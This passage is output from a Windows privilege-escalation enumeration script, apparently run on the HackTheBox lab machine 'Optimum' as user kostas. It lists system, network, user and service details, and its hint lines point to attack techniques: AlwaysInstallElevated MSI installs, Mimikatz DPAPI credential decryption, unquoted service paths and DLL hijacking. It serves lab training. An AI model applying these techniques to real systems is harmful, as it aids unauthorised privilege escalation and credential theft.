Folder: \Microsoft\Windows\Server Manager                                                                                                                                                                                                   
CleanupOldPerfLogs                       N/A                    Ready                                                                                                                                                                       
ServerManager                            N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Servicing                                                                                                                                                                                                        
StartComponentCleanup                    N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Shell                                                                                                                                                                                                            
CreateObjectTask                         N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Software Inventory Logging                                                                                                                                                                                       
Configuration                            N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\SoftwareProtectionPlatform                                                                                                                                                                                       
SvcRestartTaskLogon                      N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Storage Tiers Management                                                                                                                                                                                         
Storage Tiers Management Initialization  N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Task Manager                                                                                                                                                                                                     
Interactive                              N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\TaskScheduler                                                                                                                                                                                                    
Manual Maintenance                       N/A                    Ready                                                                                                                                                                       
Regular Maintenance                      5/5/2025 3:33:43 ��    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\TextServicesFramework                                                                                                                                                                                            
MsCtfMonitor                             N/A                    Running                                                                                                                                                                     
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Time Synchronization                                                                                                                                                                                             
SynchronizeTime                          N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Time Zone                                                                                                                                                                                                        
SynchronizeTimeZone                      N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\WDI                                                                                                                                                                                                              
ResolutionHost                           N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Windows Error Reporting                                                                                                                                                                                          
QueueReporting                           N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Windows Filtering Platform                                                                                                                                                                                       
BfeOnServiceStartTypeChange              N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\WindowsColorSystem                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\WindowsUpdate                                                                                                                                                                                                    
Scheduled Start                          N/A                    Ready                                                                                                                                                                       
Scheduled Start With Network             N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Wininet                                                                                                                                                                                                          
CacheTask                                N/A                    Running                                                                                                                                                                     
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Workplace Join                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\WS                                                                                                                                                                                                               
WSTask                                   N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
 [+] AlwaysInstallElevated?                                                                                                                                                                                                                 
   [i] If '1' then you can install a .msi file with admin privileges ;)                                                                                                                                                                     
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated-1                                                                                                              
                                                                                                                                                                                                                                            
[*] NETWORK                                                                                                                                                                                                                                 
 [+] CURRENT SHARES                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
Share name   Resource                        Remark                                                                                                                                                                                         
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
C$           C:\                             Default share                                                                                                                                                                                  
IPC$                                         Remote IPC                                                                                                                                                                                     
ADMIN$       C:\Windows                      Remote Admin                                                                                                                                                                                   
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] INTERFACES                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
Windows IP Configuration                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
   Host Name . . . . . . . . . . . . : optimum                                                                                                                                                                                              
   Primary Dns Suffix  . . . . . . . :                                                                                                                                                                                                      
   Node Type . . . . . . . . . . . . : Hybrid                                                                                                                                                                                               
   IP Routing Enabled. . . . . . . . : No                                                                                                                                                                                                   
   WINS Proxy Enabled. . . . . . . . : No                                                                                                                                                                                                   
   DNS Suffix Search List. . . . . . : .htb                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Ethernet adapter Ethernet0:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
   Connection-specific DNS Suffix  . : .htb                                                                                                                                                                                                 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection                                                                                                                                                           
   Physical Address. . . . . . . . . : 00-50-56-94-15-D0                                                                                                                                                                                    
   DHCP Enabled. . . . . . . . . . . : Yes                                                                                                                                                                                                  
   Autoconfiguration Enabled . . . . : Yes                                                                                                                                                                                                  
   IPv4 Address. . . . . . . . . . . : 10.129.38.48(Preferred)                                                                                                                                                                              
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                                                                                                                                                          
   Lease Obtained. . . . . . . . . . : �������, 4 ��?�� 2025 12:48:15 ��                                                                                                                                                                    
   Lease Expires . . . . . . . . . . : �������, 4 ��?�� 2025 10:18:15 ��                                                                                                                                                                    
   Default Gateway . . . . . . . . . : 10.129.0.1                                                                                                                                                                                           
   DHCP Server . . . . . . . . . . . : 10.129.0.1                                                                                                                                                                                           
   DNS Servers . . . . . . . . . . . : 8.8.8.8                                                                                                                                                                                              
   NetBIOS over Tcpip. . . . . . . . : Enabled                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Tunnel adapter isatap..htb:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
   Media State . . . . . . . . . . . : Media disconnected                                                                                                                                                                                   
   Connection-specific DNS Suffix  . : .htb                                                                                                                                                                                                 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #3                                                                                                                                                                          
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0                                                                                                                                                                              
   DHCP Enabled. . . . . . . . . . . : No                                                                                                                                                                                                   
   Autoconfiguration Enabled . . . . : Yes                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
 [+] USED PORTS                                                                                                                                                                                                                             
   [i] Check for services restricted from the outside                                                                                                                                                                                       
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2400                                                                                                                                                                 
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       576                                                                                                                                                                  
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                                                                                                                    
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                                                                                                                                    
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4                                                                                                                                                                    
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       396                                                                                                                                                                  
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       672                                                                                                                                                                  
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       700                                                                                                                                                                  
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       288                                                                                                                                                                  
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       480                                                                                                                                                                  
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       488                                                                                                                                                                  
  TCP    10.129.38.48:139       0.0.0.0:0              LISTENING       4                                                                                                                                                                    
  TCP    [::]:135               [::]:0                 LISTENING       576                                                                                                                                                                  
  TCP    [::]:445               [::]:0                 LISTENING       4                                                                                                                                                                    
  TCP    [::]:5985              [::]:0                 LISTENING       4                                                                                                                                                                    
  TCP    [::]:47001             [::]:0                 LISTENING       4                                                                                                                                                                    
  TCP    [::]:49152             [::]:0                 LISTENING       396                                                                                                                                                                  
  TCP    [::]:49153             [::]:0                 LISTENING       672                                                                                                                                                                  
  TCP    [::]:49154             [::]:0                 LISTENING       700                                                                                                                                                                  
  TCP    [::]:49155             [::]:0                 LISTENING       288                                                                                                                                                                  
  TCP    [::]:49156             [::]:0                 LISTENING       480                                                                                                                                                                  
  TCP    [::]:49157             [::]:0                 LISTENING       488                                                                                                                                                                  
                                                                                                                                                                                                                                            
 [+] FIREWALL                                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Firewall status:                                                                                                                                                                                                                            
-------------------------------------------------------------------                                                                                                                                                                         
Profile                           = Standard                                                                                                                                                                                                
Operational mode                  = Enable                                                                                                                                                                                                  
Exception mode                    = Enable                                                                                                                                                                                                  
Multicast/broadcast response mode = Enable                                                                                                                                                                                                  
Notification mode                 = Disable                                                                                                                                                                                                 
Group policy version              = Windows Firewall                                                                                                                                                                                        
Remote admin mode                 = Disable                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Ports currently open on all network interfaces:                                                                                                                                                                                             
Port   Protocol  Version  Program                                                                                                                                                                                                           
-------------------------------------------------------------------                                                                                                                                                                         
80     TCP       Any      (null)                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
IMPORTANT: Command executed successfully.                                                                                                                                                                                                   
However, "netsh firewall" is deprecated;                                                                                                                                                                                                    
use "netsh advfirewall firewall" instead.                                                                                                                                                                                                   
For more information on using "netsh advfirewall firewall" commands                                                                                                                                                                         
instead of "netsh firewall", see KB article 947709                                                                                                                                                                                          
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Domain profile configuration:                                                                                                                                                                                                               
-------------------------------------------------------------------                                                                                                                                                                         
Operational mode                  = Enable                                                                                                                                                                                                  
Exception mode                    = Enable                                                                                                                                                                                                  
Multicast/broadcast response mode = Enable                                                                                                                                                                                                  
Notification mode                 = Disable                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Allowed programs configuration for Domain profile:                                                                                                                                                                                          
Mode     Traffic direction    Name / Program                                                                                                                                                                                                
-------------------------------------------------------------------                                                                                                                                                                         
                                                                                                                                                                                                                                            
Port configuration for Domain profile:                                                                                                                                                                                                      
Port   Protocol  Mode    Traffic direction     Name                                                                                                                                                                                         
-------------------------------------------------------------------                                                                                                                                                                         
80     TCP       Enable  Inbound               HFS                                                                                                                                                                                          
                                                                                                                                                                                                                                            
ICMP configuration for Domain profile:                                                                                                                                                                                                      
Mode     Type  Description                                                                                                                                                                                                                  
-------------------------------------------------------------------                                                                                                                                                                         
Enable   2     Allow outbound packet too big                                                                                                                                                                                                
                                                                                                                                                                                                                                            
Standard profile configuration (current):                                                                                                                                                                                                   
-------------------------------------------------------------------                                                                                                                                                                         
Operational mode                  = Enable                                                                                                                                                                                                  
Exception mode                    = Enable                                                                                                                                                                                                  
Multicast/broadcast response mode = Enable                                                                                                                                                                                                  
Notification mode                 = Disable                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Service configuration for Standard profile:                                                                                                                                                                                                 
Mode     Customized  Name                                                                                                                                                                                                                   
-------------------------------------------------------------------                                                                                                                                                                         
Enable   Yes         Network Discovery                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Allowed programs configuration for Standard profile:                                                                                                                                                                                        
Mode     Traffic direction    Name / Program                                                                                                                                                                                                
-------------------------------------------------------------------                                                                                                                                                                         
                                                                                                                                                                                                                                            
Port configuration for Standard profile:                                                                                                                                                                                                    
Port   Protocol  Mode    Traffic direction     Name                                                                                                                                                                                         
-------------------------------------------------------------------                                                                                                                                                                         
80     TCP       Enable  Inbound               HFS                                                                                                                                                                                          
                                                                                                                                                                                                                                            
ICMP configuration for Standard profile:                                                                                                                                                                                                    
Mode     Type  Description                                                                                                                                                                                                                  
-------------------------------------------------------------------                                                                                                                                                                         
Enable   2     Allow outbound packet too big                                                                                                                                                                                                
                                                                                                                                                                                                                                            
Log configuration:                                                                                                                                                                                                                          
-------------------------------------------------------------------                                                                                                                                                                         
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log                                                                                                                                                                       
Max file size   = 4096 KB                                                                                                                                                                                                                   
Dropped packets = Disable                                                                                                                                                                                                                   
Connections     = Disable                                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
IMPORTANT: Command executed successfully.                                                                                                                                                                                                   
However, "netsh firewall" is deprecated;                                                                                                                                                                                                    
use "netsh advfirewall firewall" instead.                                                                                                                                                                                                   
For more information on using "netsh advfirewall firewall" commands                                                                                                                                                                         
instead of "netsh firewall", see KB article 947709                                                                                                                                                                                          
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] ARP                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
Interface: 10.129.38.48 --- 0xc                                                                                                                                                                                                             
  Internet Address      Physical Address      Type                                                                                                                                                                                          
  10.129.0.1            00-50-56-b9-f8-ec     dynamic                                                                                                                                                                                       
  10.129.255.255        ff-ff-ff-ff-ff-ff     static                                                                                                                                                                                        
  224.0.0.22            01-00-5e-00-00-16     static                                                                                                                                                                                        
  224.0.0.252           01-00-5e-00-00-fc     static                                                                                                                                                                                        
  255.255.255.255       ff-ff-ff-ff-ff-ff     static                                                                                                                                                                                        
                                                                                                                                                                                                                                            
 [+] ROUTES                                                                                                                                                                                                                                 
===========================================================================                                                                                                                                                                 
Interface List                                                                                                                                                                                                                              
 12...00 50 56 94 15 d0 ......Intel(R) 82574L Gigabit Network Connection                                                                                                                                                                    
  1...........................Software Loopback Interface 1                                                                                                                                                                                 
 25...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3                                                                                                                                                                                   
===========================================================================                                                                                                                                                                 
                                                                                                                                                                                                                                            
IPv4 Route Table                                                                                                                                                                                                                            
===========================================================================                                                                                                                                                                 
Active Routes:                                                                                                                                                                                                                              
Network Destination        Netmask          Gateway       Interface  Metric                                                                                                                                                                 
          0.0.0.0          0.0.0.0       10.129.0.1     10.129.38.48     10                                                                                                                                                                 
       10.129.0.0      255.255.0.0         On-link      10.129.38.48    266                                                                                                                                                                 
     10.129.38.48  255.255.255.255         On-link      10.129.38.48    266                                                                                                                                                                 
   10.129.255.255  255.255.255.255         On-link      10.129.38.48    266                                                                                                                                                                 
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306                                                                                                                                                                 
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306                                                                                                                                                                 
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                                                                                                                                                 
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306                                                                                                                                                                 
        224.0.0.0        240.0.0.0         On-link      10.129.38.48    266                                                                                                                                                                 
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                                                                                                                                                 
  255.255.255.255  255.255.255.255         On-link      10.129.38.48    266                                                                                                                                                                 
===========================================================================                                                                                                                                                                 
Persistent Routes:                                                                                                                                                                                                                          
  None                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
IPv6 Route Table                                                                                                                                                                                                                            
===========================================================================                                                                                                                                                                 
Active Routes:                                                                                                                                                                                                                              
 If Metric Network Destination      Gateway                                                                                                                                                                                                 
  1    306 ::1/128                  On-link                                                                                                                                                                                                 
  1    306 ff00::/8                 On-link                                                                                                                                                                                                 
===========================================================================                                                                                                                                                                 
Persistent Routes:                                                                                                                                                                                                                          
  None                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
 [+] Hosts file                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
 [+] DNS CACHE                                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
 [+] WIFI                                                                                                                                                                                                                                   
[*] BASIC USER INFO                                                                                                                                                                                                                         
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege                                                                                                                                                
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups                                                                                                                        
                                                                                                                                                                                                                                            
 [+] CURRENT USER                                                                                                                                                                                                                           
User name                    kostas                                                                                                                                                                                                         
Full Name                    kostas                                                                                                                                                                                                         
Comment                                                                                                                                                                                                                                     
User's comment                                                                                                                                                                                                                              
Country/region code          000 (System Default)                                                                                                                                                                                           
Account active               Yes                                                                                                                                                                                                            
Account expires              Never                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
Password last set            18/3/2017 2:56:19 ��                                                                                                                                                                                           
Password expires             Never                                                                                                                                                                                                          
Password changeable          18/3/2017 2:56:19 ��                                                                                                                                                                                           
Password required            Yes                                                                                                                                                                                                            
User may change password     Yes                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Workstations allowed         All                                                                                                                                                                                                            
Logon script                                                                                                                                                                                                                                
User profile                                                                                                                                                                                                                                
Home directory                                                                                                                                                                                                                              
Last logon                   4/5/2025 12:48:23 ��                                                                                                                                                                                           
                                                                                                                                                                                                                                            
Logon hours allowed          All                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Local Group Memberships      *Users                                                                                                                                                                                                         
Global Group memberships     *None                                                                                                                                                                                                          
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
The request will be processed at a domain controller for domain HTB.                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
USER INFORMATION                                                                                                                                                                                                                            
----------------                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
User Name      SID                                                                                                                                                                                                                          
============== ===========================================                                                                                                                                                                                  
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
GROUP INFORMATION                                                                                                                                                                                                                           
-----------------                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
Group Name                             Type             SID          Attributes                                                                                                                                                             
====================================== ================ ============ ==================================================                                                                                                                     
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                                                     
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                                                                                     
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                                                     
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                                                     
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                                                     
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                                                                                                      
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                    State                                                                                                                                                                          
============================= ============================== ========                                                                                                                                                                       
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                                                                        
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                                                                                                                                                       
                                                                                                                                                                                                                                            
ERROR: Unable to get user claims information.                                                                                                                                                                                               
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] USERS                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
User accounts for \\OPTIMUM                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
Administrator            Guest                    kostas                                                                                                                                                                                    
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] GROUPS                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Aliases for \\OPTIMUM                                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
*Access Control Assistance Operators                                                                                                                                                                                                        
*Administrators                                                                                                                                                                                                                             
*Backup Operators                                                                                                                                                                                                                           
*Certificate Service DCOM Access                                                                                                                                                                                                            
*Cryptographic Operators                                                                                                                                                                                                                    
*Distributed COM Users                                                                                                                                                                                                                      
*Event Log Readers                                                                                                                                                                                                                          
*Guests                                                                                                                                                                                                                                     
*Hyper-V Administrators                                                                                                                                                                                                                     
*IIS_IUSRS                                                                                                                                                                                                                                  
*Network Configuration Operators                                                                                                                                                                                                            
*Performance Log Users                                                                                                                                                                                                                      
*Performance Monitor Users                                                                                                                                                                                                                  
*Power Users                                                                                                                                                                                                                                
*Print Operators                                                                                                                                                                                                                            
*RDS Endpoint Servers                                                                                                                                                                                                                       
*RDS Management Servers                                                                                                                                                                                                                     
*RDS Remote Access Servers                                                                                                                                                                                                                  
*Remote Desktop Users                                                                                                                                                                                                                       
*Remote Management Users                                                                                                                                                                                                                    
*Replicator                                                                                                                                                                                                                                 
*Users                                                                                                                                                                                                                                      
*WinRMRemoteWMIUsers__                                                                                                                                                                                                                      
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] ADMINISTRATORS GROUPS                                                                                                                                                                                                                  
Alias name     Administrators                                                                                                                                                                                                               
Comment        Administrators have complete and unrestricted access to the computer/domain                                                                                                                                                  
                                                                                                                                                                                                                                            
Members                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
Administrator                                                                                                                                                                                                                               
The command completed successfully.                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] CURRENT LOGGED USERS                                                                                                                                                                                                                   
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                                                                                                                                                 
>kostas                console             1  Active      none   4/5/2025 12:48 ��                                                                                                                                                          
                                                                                                                                                                                                                                            
 [+] Kerberos Tickets                                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
Current LogonId is 0:0x50ac2                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
Cached Tickets: (0)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
 [+] CURRENT CLIPBOARD                                                                                                                                                                                                                      
   [i] Any passwords inside the clipboard?                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
[*] SERVICE VULNERABILITIES                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                                                                                                                                        
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                                             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                               
                                                                                                                                                                                                                                            
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                            
                                                                                                                                                                                                                                            
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(F)                                                                                                                                             
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(F)                                                                                                                                                                
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe BUILTIN\Administrators:(F)                                                                                                                                     
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe BUILTIN\Administrators:(F)                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                                                                                                                                           
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                                             
                                                                                                                                                                                                                                            
 [+] UNQUOTED SERVICE PATHS                                                                                                                                                                                                                 
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                                                                                                                                                                      
   [i] The permissions are also checked and filtered using icacls                                                                                                                                                                           
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                                             
NetTcpPortSharing                                                                                                                                                                                                                           
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                                                                                                                                              
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                               
                                                                                                                                                                                                                                            
PerfHost                                                                                                                                                                                                                                    
 C:\Windows\SysWow64\perfhost.exe                                                                                                                                                                                                           
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                            
                                                                                                                                                                                                                                            
TrustedInstaller                                                                                                                                                                                                                            
 C:\Windows\servicing\TrustedInstaller.exe                                                                                                                                                                                                  
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                   
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] DLL HIJACKING in PATHenv variable                                                                                                                                                                                                       
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations                                                                                                                                    
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                                                                                                                                             
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking                                                                                                                        
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                         
                                                                                                                                                                                                                                            
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] CREDENTIALS                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
 [+] WINDOWS VAULT                                                                                                                                                                                                                          
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault                                                                                                   
                                                                                                                                                                                                                                            
Currently stored credentials:                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
* NONE *                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
 [+] DPAPI MASTER KEYS                                                                                                                                                                                                                      
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                                                                                                                                              
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi                                                                                                                                
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
    Directory: C:\Users\kostas\AppData\Roaming\Microsoft\Protect                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Mode                LastWriteTime     Length Name                                                                                                                                                                                           
----                -------------     ------ ----                                                                                                                                                                                           
d---s         18/3/2017   1:57 ��            S-1-5-21-605891470-2991919448-81205106-1001                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] DPAPI MASTER KEYS                                                                                                                                                                                                                      
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                                                                                                                                                         
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module                                                                                                                                    
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi                                                                                                                                
                                                                                                                                                                                                                                            
Looking inside C:\Users\kostas\AppData\Roaming\Microsoft\Credentials\                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Looking inside C:\Users\kostas\AppData\Local\Microsoft\Credentials\                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] Unattended files                                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
 [+] SAM and SYSTEM backups                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
 [+] McAffee SiteList.xml                                                                                                                                                                                                                   
 Volume in drive C has no label.                                                                                                                                                                                                            
 Volume Serial Number is EE82-226D                                                                                                                                                                                                          
 Volume in drive C has no label.                                                                                                                                                                                                            
 Volume Serial Number is EE82-226D                                                                                                                                                                                                          
 Volume in drive C has no label.                                                                                                                                                                                                            
 Volume Serial Number is EE82-226D                                                                                                                                                                                                          
 Volume in drive C has no label.                                                                                                                                                                                                            
 Volume Serial Number is EE82-226D                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
 [+] GPP Password                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
 [+] Cloud Credentials                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
 [+] AppCmd                                                                                                                                                                                                                                 
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe                                                                                                                            
                                                                                                                                                                                                                                            
 [+] Files in registry that may contain credentials                                                                                                                                                                                         
   [i] Searching specific files that may contains credentials.                                                                                                                                                                              
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                       
